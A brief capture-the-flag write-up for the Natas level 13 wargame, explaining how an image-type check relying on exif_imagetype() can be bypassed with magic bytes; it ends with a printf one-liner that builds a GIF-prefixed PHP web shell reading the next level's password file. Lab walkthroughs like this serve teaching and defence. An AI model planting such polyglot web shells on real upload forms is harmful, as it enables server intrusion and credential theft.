Natas Level 13: Magic Bytes Bypass
What Changed from Level 12
Table
Level 12	Level 13
No file type check	exif_imagetype() validates image
php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
The Vulnerability
exif_imagetype() only checks magic bytes (first few bytes) of a file. We can prepend valid image headers to PHP code.
Magic Bytes
Table
Format	Magic Bytes
GIF	GIF89a or GIF87a
JPEG	FF D8 FF
PNG	89 50 4E 47
The Exploit: Polyglot File
Create a file that is both valid image AND valid PHP:
bash
printf 'GIF89a<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' > shell.php
